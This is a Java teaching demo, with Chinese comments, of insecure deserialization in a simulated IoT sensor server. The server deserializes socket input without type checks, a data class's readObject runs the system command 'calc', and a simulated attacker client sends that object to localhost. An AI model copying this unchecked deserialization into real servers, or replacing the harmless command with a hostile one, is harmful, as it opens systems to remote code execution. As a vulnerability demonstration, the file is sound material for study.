import java.io.*;
import java.net.*;

class SensorData implements Serializable {
    private String deviceId;
    private double temperature;
    
    public SensorData(String id, double temp) {
        this.deviceId = id;
        this.temperature = temp;
    }
    
    // 恶意readObject方法
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        try {
            // 模拟危险操作：执行系统命令
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

public class IoTServer {
    public static void main(String[] args) {
        try (ServerSocket serverSocket = new ServerSocket(8080)) {
            System.out.println("服务器启动，等待设备连接...");
            
            while (true) {
                Socket socket = serverSocket.accept();
                handleClient(socket);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private static void handleClient(Socket socket) {
        try (ObjectInputStream ois = new ObjectInputStream(socket.getInputStream())) {
            System.out.println("收到设备数据...");
            // 不安全的反序列化操作
            Object obj = ois.readObject(); // 未验证对象类型
            
            if (obj instanceof SensorData) {
                SensorData data = (SensorData) obj;
                System.out.println("设备ID: " + data.deviceId);
                System.out.println("温度: " + data.temperature + "℃");
            }
        } catch (Exception e) {
            System.out.println("数据处理异常: " + e.getMessage());
        }
    }
}

// 模拟攻击者客户端
class AttackerClient {
    public static void main(String[] args) throws Exception {
        try (Socket socket = new Socket("127.0.0.1", 8080);
             ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream())) {
            
            // 构造恶意序列化对象
            SensorData maliciousData = new SensorData("malicious_device", 999.9);
            oos.writeObject(maliciousData);
            oos.flush();
        }
    }
}